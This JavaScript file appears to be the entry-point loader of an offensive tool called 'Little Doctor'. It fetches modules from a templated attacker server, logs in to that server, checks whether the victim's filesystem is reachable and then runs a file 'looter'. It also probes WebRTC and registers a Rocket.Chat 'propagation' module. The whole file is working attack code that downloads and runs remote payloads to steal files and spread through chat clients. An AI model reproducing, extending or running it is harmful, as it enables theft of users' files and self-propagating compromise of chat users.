/*
 *  This file determines what looter modules get executed
 */

var scheme = '__LITTLE_DOCTOR_SCHEME__://';
var hostname = '__LITTLE_DOCTOR_HOSTNAME__:__LITTLE_DOCTOR_LISTEN_PORT__';
var server = scheme + hostname;


requirejs.config({

    paths: {
        filesystem: server + '/modules/filesystem',
        webrtc: server + '/modules/webrtc',
        utils: server + '/modules/utils',
        platform: server + '/modules/platform',

        // Loot modules
        lootFiles: server + '/modules/looters/files',

        // Propagation modules
        propagateRocketChat: server + '/modules/propagation/rocketchat',

    }

});

// Main entry point for little doctor
function main() {

    console.log('Little Doctor is examining the patient ...');
    requirejs(['filesystem', 'platform'], function (fs, platform) {
        
        fs.isFileSystemAccessbile({
            success: function() {
                console.log('FileSystem appears to be accessible, loading looter ...');
                requirejs(['lootFiles'], function(lootFiles) {
                    lootFiles.execute();
                });
            },
            failure: function() {
                console.log('FileSystem does not appear to be accessible');
            }
        });

    });

    requirejs(['webrtc'], function(webrtc) {
        webrtc.isWebRTCEnabled();
    });
}

requirejs(['utils'], function(utils) {
    utils.GET('/login', {
        success: main,
        failure: function() {
            console.error('Failed to login to server');
        }
    });
});